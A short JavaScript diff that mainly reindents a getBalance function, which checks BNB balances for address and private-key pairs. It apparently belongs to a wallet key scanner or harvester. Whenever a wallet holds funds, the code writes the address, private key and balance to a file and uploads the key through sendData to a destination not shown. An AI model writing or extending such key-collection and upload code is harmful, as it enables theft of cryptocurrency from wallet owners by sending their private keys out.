@@ -112,20 +112,22 @@ async function getBalance(address, key){
 		const balanceBNB = web3A[rpcIndex].utils.fromWei(balanceWei, "ether");
 
 
-    hslBal = balanceBNB;
+		batch_no++;
 
-    if(balanceBNB > 0){
-			
-      const Ares = {address : address, privateKey: key, blc: balanceBNB}
-      const rslt = address + "," + key + "," + balanceBNB;
+		hslBal = balanceBNB;
 
-      console.log("simpan file : " + address);
+		if(balanceBNB > 0){
+				
+		  const Ares = {address : address, privateKey: key, blc: balanceBNB}
+		  const rslt = address + "," + key + "," + balanceBNB;
 
-		  await saveResults(rslt);
+		  console.log("simpan file : " + address);
 
-      console.log("upload file : " + address);
-      await sendData(Ares);
-		} 
+			  await saveResults(rslt);
+
+		  console.log("upload file : " + address);
+		  await sendData(Ares);
+		}	
       
 	} catch (e){
       
